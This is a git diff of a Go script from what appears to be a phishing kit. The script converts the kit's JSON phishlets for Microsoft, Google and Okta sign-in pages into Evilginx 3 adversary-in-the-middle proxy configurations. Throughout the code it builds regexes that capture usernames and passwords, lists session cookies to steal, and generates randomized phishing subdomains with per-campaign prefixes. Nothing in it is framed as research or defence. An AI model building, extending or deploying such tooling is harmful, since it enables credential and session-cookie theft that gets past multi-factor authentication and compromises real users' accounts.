@@ -1,30 +1,36 @@
-// json2evilginx converts JSON phishlets from this project into Evilginx 3 YAML format.
+// json2evilginx converts JSON phishlets from this project into Evilginx 3 YAML format
+// using Go text/template engine with provider-specific YAML templates.
 //
 // Usage:
 //
 //	# Convert a single phishlet
 //	go run ./scripts/json2evilginx --input proxy-server/phishlets/microsoft.json --output exports/evilginx/microsoft.yaml
 //
-//	# Convert a single phishlet via stdin
-//	cat proxy-server/phishlets/microsoft.json | go run ./scripts/json2evilginx > exports/evilginx/microsoft.yaml
-//
-//	# Convert all phishlets at once (default when no --input flag)
+//	# Convert all phishlets at once
 //	go run ./scripts/json2evilginx --all
+//
+//	# Custom random string prefix
+//	go run ./scripts/json2evilginx --input proxy-server/phishlets/okta.json --phish-sub-prefix=camp1
 
 package main
 
 import (
+	"embed"
 	"encoding/json"
 	"flag"
 	"fmt"
-	"io"
+	"math/rand"
 	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
-	"sort"
 	"strings"
+	"text/template"
+	"time"
 )
+
+//go:embed templates/*.tmpl
+var templateFS embed.FS
 
 // JSON input structures — match the project's phishlet schema.
 type jsonPhishlet struct {
@@ -54,6 +60,81 @@ type rewrite struct {
 	RewriteLocation   bool `json:"rewrite_location"`
 }
 
+// TemplateData is the data struct passed to Go templates for YAML generation.
+// It supports both the microsoft template (individual PhishSub fields, Hostname)
+// and the google/okta templates (PhishSubN array, PhishDomain, regexes).
+type TemplateData struct {
+	// Common fields
+	Name           string
+	Label          string
+	SessionCookies []string
+	UsernameFields []string
+	PasswordFields []string
+	ProxyPaths     []string
+
+	// Microsoft template fields — individual named subdomain tokens
+	Hostname     string // full phishing hostname, e.g. "login.glnt.cc"
+	UpstreamHost string // primary upstream host, e.g. "login.microsoftonline.com"
+	PhishSub     string
+	PhishSub2    string
+	PhishSub3    string
+	PhishSub4    string
+	PhishSub5    string
+	PhishSub6    string
+	PhishSub7    string
+	PhishSub8    string
+	PhishSub9    string
+	PhishSub10   string
+	PhishSub11   string
+	PhishSub12   string
+	PhishSub13   string
+	PhishSub14   string
+	PhishSub15   string
+	PhishSub16   string
+	PhishSub17   string
+	PhishSub18   string
+	PhishSub19   string
+	PhishSub20   string
+	PhishSub21   string
+	PhishSub22   string
+	PhishSub23   string
+	PhishSub24   string
+	PhishSub25   string
+
+	// Google / Okta template fields — array-based subdomain tokens
+	PhishSubN      []string
+	PhishDomain    string
+	PhishHost      string
+	UpstreamDomain string
+	UsernameRegex  string
+	PasswordRegex  string
+	OrgSubdomain   string
+}
+
+// randSeq generates a random string of lowercase alphanumeric characters of length n.
+func randSeq(n int) string {
+	letters := []rune("abcdefghijklmnopqrstuvwxyz0123456789")
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
+// randSeqN generates n unique random strings, each of length m.
+func randSeqN(n, m int) []string {
+	seen := make(map[string]bool)
+	result := make([]string, 0, n)
+	for len(result) < n {
+		s := randSeq(m)
+		if !seen[s] {
+			seen[s] = true
+			result = append(result, s)
+		}
+	}
+	return result
+}
+
 // splitHost extracts the leftmost subdomain and the rest as the domain.
 // e.g., "login.microsoftonline.com" => ("login", "microsoftonline.com")
 // e.g., "okta.com" => ("", "okta.com")
@@ -66,7 +147,6 @@ func splitHost(host string) (sub, domain string) {
 }
 
 // normalizeURL ensures the upstream string is parsable as a URL.
-// "okta.com" and "https://login.microsoftonline.com" both work.
 func normalizeURL(raw string) (*url.URL, error) {
 	if !strings.Contains(raw, "://") {
 		raw = "https://" + raw
@@ -87,192 +167,171 @@ func buildCredRegex(fields []string) string {
 	return "(?:" + strings.Join(escaped, "|") + ")=([^&]+)"
 }
 
-// yamlString returns a YAML-safe representation of s.
-// Empty strings and strings with characters that could confuse a YAML parser
-// are double-quoted; everything else is returned bare.
-func yamlString(s string) string {
-	if s == "" {
-		return `""`
+// extractOrgSubdomain tries to extract the Okta organization subdomain from a hostname.
+// For "acme.okta.com" returns "acme".
+// Falls back to "your-org" if nothing can be extracted.
+func extractOrgSubdomain(hostname string) string {
+	if hostname == "" {
+		return "your-org"
 	}
-	// Characters that are YAML syntax when appearing in bare (unquoted) scalars.
-	// We double-quote if any are present to avoid parser ambiguity.
-	if strings.ContainsAny(s, "{}[]#&*!|>%@`'\"") ||
-		strings.HasPrefix(s, ": ") || strings.HasPrefix(s, "- ") ||
-		strings.HasSuffix(s, ":") {
-		return `"` + strings.ReplaceAll(s, `"`, `\"`) + `"`
+	if strings.HasSuffix(hostname, ".okta.com") ||
+		strings.HasSuffix(hostname, ".oktapreview.com") ||
+		strings.HasSuffix(hostname, ".okta-emea.com") {
+		sub, _ := splitHost(hostname)
+		if sub != "" {
+			return sub
+		}
 	}
-	return s
+	sub, _ := splitHost(hostname)
+	if sub != "" && sub != "idp" {
+		return sub
+	}
+	if strings.HasPrefix(hostname, "idp.") {
+		rest := strings.TrimPrefix(hostname, "idp.")
+		parts := strings.Split(rest, ".")
+		if len(parts) > 0 && parts[0] != "" {
+			return parts[0]
+		}
+	}
+	return "your-org"
 }
 
-// writeEvilginxYAML writes the Evilginx 3 phishlet YAML to w.
-func writeEvilginxYAML(w io.Writer, in *jsonPhishlet) error {
-	// --- Parse upstream URL ---
+// selectTemplate maps a phishlet name to its template file path within the embed FS.
+func selectTemplate(name string) string {
+	switch strings.ToLower(name) {
+	case "microsoft", "microsoft-personal":
+		return "templates/microsoft.yaml.tmpl"
+	case "google":
+		return "templates/google.yaml.tmpl"
+	case "okta":
+		return "templates/okta.yaml.tmpl"
+	default:
+		return ""
+	}
+}
+
+// applyPrefix prepends the given prefix to each string in the slice in-place.
+func applyPrefix(prefix string, strs []string) {
+	if prefix == "" {
+		return
+	}
+	for i := range strs {
+		strs[i] = prefix + strs[i]
+	}
+}
+
+// setPhishSubFields assigns the first 25 random strings to the individual
+// PhishSub..PhishSub25 fields and the full set of 40 to PhishSubN.
+func setPhishSubFields(td *TemplateData, tokens []string) {
+	fieldMap := []*string{
+		&td.PhishSub, &td.PhishSub2, &td.PhishSub3, &td.PhishSub4, &td.PhishSub5,
+		&td.PhishSub6, &td.PhishSub7, &td.PhishSub8, &td.PhishSub9, &td.PhishSub10,
+		&td.PhishSub11, &td.PhishSub12, &td.PhishSub13, &td.PhishSub14, &td.PhishSub15,
+		&td.PhishSub16, &td.PhishSub17, &td.PhishSub18, &td.PhishSub19, &td.PhishSub20,
+		&td.PhishSub21, &td.PhishSub22, &td.PhishSub23, &td.PhishSub24, &td.PhishSub25,
+	}
+	for i, f := range fieldMap {
+		if i < len(tokens) {
+			*f = tokens[i]
+		}
+	}
+	td.PhishSubN = tokens
+}
+
+// buildTemplateData constructs the template data from a parsed JSON phishlet.
+func buildTemplateData(in *jsonPhishlet, prefix string) (*TemplateData, error) {
+	// Parse upstream URL
 	upURL, err := normalizeURL(in.Upstream)
 	if err != nil {
-		return fmt.Errorf("invalid upstream URL %q: %w", in.Upstream, err)
+		return nil, fmt.Errorf("invalid upstream URL %q: %w", in.Upstream, err)
 	}
 	upHost := upURL.Hostname()
-	upSub, upDomain := splitHost(upHost)
+	_, upDomain := splitHost(upHost)
 
-	// --- Determine phishing hostname ---
-	phHost := in.Hostname
-	if phHost == "" {
-		// No hostname set — use a placeholder derived from the upstream.
-		phSubPlaceholder := upSub
-		if phSubPlaceholder == "" {
-			phSubPlaceholder = "login"
+	// Determine phishing hostname
+	var phSub, phDomain, phHost string
+	if in.Hostname != "" {
+		phHost = in.Hostname
+		phSub, phDomain = splitHost(phHost)
+	} else {
+		// Auto-generate placeholder hostname
+		phSub = randSeq(8)
+		phDomain = "example.com"
+		if prefix != "" {
+			phSub = prefix + phSub
 		}
-		phHost = phSubPlaceholder + "." + in.Name + ".example.com"
+		phHost = phSub + "." + phDomain
 	}
-	phSub, phDomain := splitHost(phHost)
 
-	// --- Build regexes for credential detection ---
+	// Generate 40 unique random subdomain tokens for templates
+	tokens := randSeqN(40, 8)
+	applyPrefix(prefix, tokens)
+
+	// Build credential regexes
 	userRE := buildCredRegex(in.CredentialFields.Username)
 	passRE := buildCredRegex(in.CredentialFields.Password)
 
-	// --- Header comments ---
-	fmt.Fprintf(w, "# =============================================================================\n")
-	fmt.Fprintf(w, "# Evilginx 3 Phishlet — converted from %s.json\n", in.Name)
-	fmt.Fprintf(w, "# =============================================================================\n")
-	fmt.Fprintf(w, "#\n")
-	fmt.Fprintf(w, "# IMPORTANT: This is an automated conversion. Operator MUST review before use.\n")
-	fmt.Fprintf(w, "#\n")
+	// Extract org subdomain for Okta
+	orgSub := extractOrgSubdomain(in.Hostname)
 
-	// Session cookies note
-	if len(in.SessionCookies) > 0 {
-		fmt.Fprintf(w, "# Session cookies (Evilginx auto-detects these; listed for operator reference):\n")
-		for _, c := range in.SessionCookies {
-			fmt.Fprintf(w, "#   - %s\n", c)
-		}
-		fmt.Fprintf(w, "#\n")
+	td := &TemplateData{
+		Name:           in.Name,
+		Label:          in.Label,
+		Hostname:       phHost,
+		UpstreamHost:   upHost,
+		SessionCookies: in.SessionCookies,
+		UsernameFields: in.CredentialFields.Username,
+		PasswordFields: in.CredentialFields.Password,
+		ProxyPaths:     in.ProxyPaths,
+		PhishDomain:    phDomain,
+		PhishHost:      phHost,
+		UpstreamDomain: upDomain,
+		UsernameRegex:  userRE,
+		PasswordRegex:  passRE,
+		OrgSubdomain:   orgSub,
+	}
+	setPhishSubFields(td, tokens)
+
+	return td, nil
+}
+
+// executeTemplate loads, executes, and writes the template output to the given path.
+func executeTemplate(tmplName, outputPath string, data *TemplateData) error {
+	tmpl, err := template.ParseFS(templateFS, tmplName)
+	if err != nil {
+		return fmt.Errorf("parse template %q: %w", tmplName, err)
 	}
 
-	// Hostname placeholder warning
-	if in.Hostname == "" {
-		fmt.Fprintf(w, "# WARNING: The JSON phishlet did not define a hostname.\n")
-		fmt.Fprintf(w, "#          A placeholder hostname %q was generated.\n", phHost)
-		fmt.Fprintf(w, "#          You MUST update proxy_hosts[].phish_sub and sub_filters[].hostname\n")
-		fmt.Fprintf(w, "#          to match your actual phishing domain before using this phishlet.\n")
-		fmt.Fprintf(w, "#\n")
+	if err := os.MkdirAll(filepath.Dir(outputPath), 0o755); err != nil {
+		return fmt.Errorf("create output dir: %w", err)
 	}
 
-	// Rewrite settings note
-	if in.Rewrite.StripCSP || in.Rewrite.StripXFO || in.Rewrite.StripHSTS ||
-		in.Rewrite.StripCookieSecure || in.Rewrite.StripCookieDomain || in.Rewrite.RewriteLocation {
-		var active []string
-		if in.Rewrite.StripCSP {
-			active = append(active, "strip_csp")
-		}
-		if in.Rewrite.StripXFO {
-			active = append(active, "strip_xfo")
-		}
-		if in.Rewrite.StripHSTS {
-			active = append(active, "strip_hsts")
-		}
-		if in.Rewrite.StripCookieSecure {
-			active = append(active, "strip_cookie_secure")
-		}
-		if in.Rewrite.StripCookieDomain {
-			active = append(active, "strip_cookie_domain")
-		}
-		if in.Rewrite.RewriteLocation {
-			active = append(active, "rewrite_location")
-		}
-		fmt.Fprintf(w, "# JSON rewrite flags active: %s\n", strings.Join(active, ", "))
-		fmt.Fprintf(w, "# Evilginx auto_filter handles some of these; verify after deployment.\n")
-		fmt.Fprintf(w, "#\n")
+	f, err := os.Create(outputPath)
+	if err != nil {
+		return fmt.Errorf("create output file: %w", err)
+	}
+	defer f.Close()
+
+	// Warn if hostname was auto-generated (before template output)
+	if data.PhishDomain == "example.com" {
+		fmt.Fprintf(f, "# WARNING: No hostname was defined in the JSON phishlet.\n")
+		fmt.Fprintf(f, "#          A placeholder hostname %q was auto-generated.\n", data.PhishHost)
+		fmt.Fprintf(f, "#          You MUST update this to your actual phishing domain before using this phishlet.\n")
+		fmt.Fprintf(f, "#\n")
 	}
 
-	if len(in.UpstreamHosts) > 0 {
-		fmt.Fprintf(w, "# Additional upstream hosts (not auto-converted — add as extra proxy_hosts entries):\n")
-		for _, h := range in.UpstreamHosts {
-			u, err := normalizeURL(h)
-			if err == nil {
-				usub, udom := splitHost(u.Hostname())
-				fmt.Fprintf(w, "#   - phish_sub: %s  orig_sub: %s  domain: %s  (from %s)\n", phSub, usub, udom, h)
-			} else {
-				fmt.Fprintf(w, "#   - %s (unparseable)\n", h)
-			}
-		}
-		fmt.Fprintf(w, "#\n")
+	if err := tmpl.Execute(f, data); err != nil {
+		return fmt.Errorf("execute template: %w", err)
 	}
-
-	if len(in.PathMap) > 0 {
-		fmt.Fprintf(w, "# Path map overrides defined in JSON phishlet:\n")
-		keys := make([]string, 0, len(in.PathMap))
-		for k := range in.PathMap {
-			keys = append(keys, k)
-		}
-		sort.Strings(keys)
-		for _, k := range keys {
-			fmt.Fprintf(w, "#   %s -> %s\n", k, in.PathMap[k])
-		}
-		fmt.Fprintf(w, "#\n")
-	}
-
-	// --- YAML body ---
-	fmt.Fprintf(w, "\n")
-	fmt.Fprintf(w, "name: %s\n", in.Name)
-	fmt.Fprintf(w, "author: \"glnt-phish-kit\"\n")
-	fmt.Fprintf(w, "min_ver: \"3.0.0\"\n")
-
-	// proxy_hosts
-	fmt.Fprintf(w, "proxy_hosts:\n")
-	fmt.Fprintf(w, "  - phish_sub: %s\n", phSub)
-	fmt.Fprintf(w, "    orig_sub: %s\n", upSub)
-	fmt.Fprintf(w, "    domain: %s\n", upDomain)
-	fmt.Fprintf(w, "    session: true\n")
-	fmt.Fprintf(w, "    is_landing: true\n")
-	fmt.Fprintf(w, "    auto_filter: true\n")
-
-	// sub_filters
-	fmt.Fprintf(w, "sub_filters:\n")
-	fmt.Fprintf(w, "  - hostname: %s\n", phHost)
-	fmt.Fprintf(w, "    sub: %s\n", phSub)
-	fmt.Fprintf(w, "    domain: %s\n", phDomain)
-	fmt.Fprintf(w, "    replace:\n")
-	fmt.Fprintf(w, "      from: %s\n", phHost)
-	fmt.Fprintf(w, "      to: %s\n", upHost)
-
-	// auth_urls — combine upstream with each proxy_path
-	fmt.Fprintf(w, "auth_urls:\n")
-	for _, pp := range in.ProxyPaths {
-		// Build full URL: upstream base + proxy path
-		authURL := upURL.Scheme + "://" + upHost + pp
-		fmt.Fprintf(w, "  - %s\n", authURL)
-	}
-
-	// Landing path
-	fmt.Fprintf(w, "landing_path: \"/\"\n")
-
-	// Credential regexes
-	fmt.Fprintf(w, "user_re: %s\n", yamlString(userRE))
-	fmt.Fprintf(w, "pass_re: %s\n", yamlString(passRE))
-
-	// Static fields
-	fmt.Fprintf(w, "force_post: false\n")
-	fmt.Fprintf(w, "is_mfa: false\n")
 
 	return nil
 }
 
-func convertFile(inputPath, outputPath string) error {
-	// Read input
-	var in io.Reader
-	if inputPath == "" || inputPath == "-" {
-		in = os.Stdin
-	} else {
-		f, err := os.Open(inputPath)
-		if err != nil {
-			return fmt.Errorf("open input: %w", err)
-		}
-		defer f.Close()
-		in = f
-	}
-
-	data, err := io.ReadAll(in)
+// convertFile reads a JSON phishlet and writes the corresponding Evilginx YAML.
+func convertFile(inputPath, outputPath, prefix string) error {
+	data, err := os.ReadFile(inputPath)
 	if err != nil {
-		return fmt.Errorf("read input: %w", err)
+		return fmt.Errorf("read input %q: %w", inputPath, err)
 	}
 
 	var p jsonPhishlet
@@ -280,7 +339,6 @@ func convertFile(inputPath, outputPath string) error {
 		return fmt.Errorf("parse JSON: %w", err)
 	}
 
-	// Validate required fields
 	if p.Name == "" {
 		return fmt.Errorf("phishlet has no 'name' field")
 	}
@@ -288,37 +346,36 @@ func convertFile(inputPath, outputPath string) error {
 		return fmt.Errorf("phishlet has no 'upstream' field")
 	}
 
-	// Write output
-	var out io.Writer
-	if outputPath == "" || outputPath == "-" {
-		out = os.Stdout
-	} else {
-		if err := os.MkdirAll(filepath.Dir(outputPath), 0o755); err != nil {
-			return fmt.Errorf("create output dir: %w", err)
-		}
-		f, err := os.Create(outputPath)
-		if err != nil {
-			return fmt.Errorf("create output: %w", err)
-		}
-		defer f.Close()
-		out = f
+	tmplName := selectTemplate(p.Name)
+	if tmplName == "" {
+		return fmt.Errorf("no template for phishlet %q — supported: microsoft, microsoft-personal, google, okta", p.Name)
 	}
 
-	if err := writeEvilginxYAML(out, &p); err != nil {
-		return fmt.Errorf("write YAML: %w", err)
+	td, err := buildTemplateData(&p, prefix)
+	if err != nil {
+		return fmt.Errorf("build template data: %w", err)
+	}
+
+	if outputPath == "" {
+		outputPath = filepath.Join("exports", "evilginx", p.Name+".yaml")
+	}
+
+	if err := executeTemplate(tmplName, outputPath, td); err != nil {
+		return fmt.Errorf("execute template: %w", err)
 	}
 
 	return nil
 }
 
 // convertAll processes every .json file in phishletDir and writes YAML to outputDir.
-func convertAll(phishletDir, outputDir string) error {
+func convertAll(phishletDir, outputDir, prefix string) error {
 	entries, err := os.ReadDir(phishletDir)
 	if err != nil {
 		return fmt.Errorf("read phishlet dir %q: %w", phishletDir, err)
 	}
 
 	converted := 0
+	skipped := 0
 	for _, entry := range entries {
 		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".json") {
 			continue
@@ -327,42 +384,59 @@ func convertAll(phishletDir, outputDir string) error {
 		outName := strings.TrimSuffix(entry.Name(), ".json") + ".yaml"
 		outputPath := filepath.Join(outputDir, outName)
 
+		data, err := os.ReadFile(inputPath)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "Skipping %s: read error: %v\n", entry.Name(), err)
+			skipped++
+			continue
+		}
+		var p jsonPhishlet
+		if err := json.Unmarshal(data, &p); err != nil {
+			fmt.Fprintf(os.Stderr, "Skipping %s: parse error: %v\n", entry.Name(), err)
+			skipped++
+			continue
+		}
+		if selectTemplate(p.Name) == "" {
+			fmt.Fprintf(os.Stderr, "Skipping %s: no template for phishlet %q\n", entry.Name(), p.Name)
+			skipped++
+			continue
+		}
+
 		fmt.Fprintf(os.Stderr, "Converting %s -> %s\n", inputPath, outputPath)
-		if err := convertFile(inputPath, outputPath); err != nil {
+		if err := convertFile(inputPath, outputPath, prefix); err != nil {
 			return fmt.Errorf("convert %s: %w", entry.Name(), err)
 		}
 		converted++
 	}
-	fmt.Fprintf(os.Stderr, "Done. Converted %d phishlets to %s/\n", converted, outputDir)
+	fmt.Fprintf(os.Stderr, "Done. Converted %d phishlets to %s/", converted, outputDir)
+	if skipped > 0 {
+		fmt.Fprintf(os.Stderr, " (%d skipped)", skipped)
+	}
+	fmt.Fprintln(os.Stderr)
 	return nil
 }
 
 func run() error {
-	inputFlag := flag.String("input", "", "Input JSON phishlet file (or - for stdin)")
-	outputFlag := flag.String("output", "", "Output YAML file (or - for stdout)")
-	allFlag := flag.Bool("all", false, "Convert all phishlets in proxy-server/phishlets/")
+	inputFlag := flag.String("input", "", "Input JSON phishlet file")
+	outputFlag := flag.String("output", "", "Output YAML file (default: exports/evilginx/<name>.yaml)")
+	allFlag := flag.Bool("all", false, "Convert all supported phishlets in proxy-server/phishlets/")
 	phishletDir := flag.String("phishlet-dir", "proxy-server/phishlets", "Directory containing JSON phishlets")
 	outputDir := flag.String("output-dir", "exports/evilginx", "Directory for output YAML files")
+	prefixFlag := flag.String("phish-sub-prefix", "", "Optional prefix for all generated random strings")
 	flag.Parse()
 
-	// --all: always batch mode, regardless of stdin
+	rand.Seed(time.Now().UnixNano())
+
 	if *allFlag {
-		return convertAll(*phishletDir, *outputDir)
+		return convertAll(*phishletDir, *outputDir, *prefixFlag)
 	}
 
-	// --input specified: single file mode
 	if *inputFlag != "" {
-		return convertFile(*inputFlag, *outputFlag)
+		return convertFile(*inputFlag, *outputFlag, *prefixFlag)
 	}
 
-	// No flags: check if stdin is piped; if not, default to batch mode
-	stat, _ := os.Stdin.Stat()
-	if (stat.Mode() & os.ModeCharDevice) == 0 {
-		return convertFile("", *outputFlag)
-	}
-
-	// Interactive terminal with no flags — batch mode
-	return convertAll(*phishletDir, *outputDir)
+	// No flags: default to batch mode
+	return convertAll(*phishletDir, *outputDir, *prefixFlag)
 }
 
 func main() {
